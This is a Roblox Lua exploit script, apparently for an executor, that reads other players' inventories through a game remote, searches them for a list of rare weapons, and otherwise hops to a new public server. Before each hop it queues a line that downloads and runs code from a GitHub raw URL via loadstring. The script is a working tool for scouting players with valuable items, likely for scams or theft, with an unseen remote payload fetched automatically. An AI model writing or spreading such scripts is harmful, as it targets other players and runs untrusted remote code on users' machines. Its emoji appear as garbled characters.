local ItemDB = require(game:GetService("ReplicatedStorage").Database.Sync.Item)
local Players = game:GetService("Players")
local Http = game:GetService("HttpService")
local preferably = {
	"ZombieBat", "Makeshift", "TravelerGun", "TreeGun2023Chroma", "Harvester", "Gingerscope", "TravelerAxe", "Celestial", "Icepiercer"
}

local function CheckInventoryForPlayer(player)
	local success, data = pcall(function()
		return game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(player)
	end)
	if success and data and data.Weapons and data.Weapons.Owned then
		local ownedItems = data.Weapons.Owned
		local foundItems = {}

		for _, itemName in ipairs(preferably) do
			if ownedItems[itemName] then
				table.insert(foundItems, itemName)
			end
		end
		if #foundItems > 0 then
			print("‚úÖ Found preferred items for player " .. player.Name)
			print("Items: " .. table.concat(foundItems, ", "))
			return true
		else
			print("‚ùå No preferred items found for player " .. player.Name)
		end
	else
		print("‚ùå Failed to get data for " .. player.Name)
	end
	return false
end

local function teleportToNewServer()
	local Api = "https://games.roblox.com/v1/games/"
	local PlaceId = game.PlaceId
	local ServersApi = Api .. PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"

	local function ListServers(cursor)
		local url = ServersApi .. ((cursor and "&cursor=" .. cursor) or "")
		local response = game:HttpGet(url)
		return Http:JSONDecode(response)
	end

	local serverFound, nextCursor
	repeat
		local data = ListServers(nextCursor)
		serverFound = data.data[1]
		nextCursor = data.nextPageCursor
	until serverFound

	queue_on_teleport([[
wait(10)
loadstring(game:HttpGet('https://raw.githubusercontent.com/ipadys/empheriumf/refs/heads/main/f.txt'))()
    ]])
	game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceId, serverFound.id, Players.LocalPlayer)
end

local isTeleporting = false

function KeepCheckingForValidPlayer()
	for _, player in ipairs(Players:GetPlayers()) do
		print("üéÆ Checking " .. player.Name)
		if CheckInventoryForPlayer(player) then
			print("üéâ Found a valid player!")
			return
		end
	end

	if not isTeleporting then
		isTeleporting = true
		print("üîÅ No matches found, teleporting...")
		teleportToNewServer()
	end
end

while true do
	KeepCheckingForValidPlayer()
	wait(10)
end
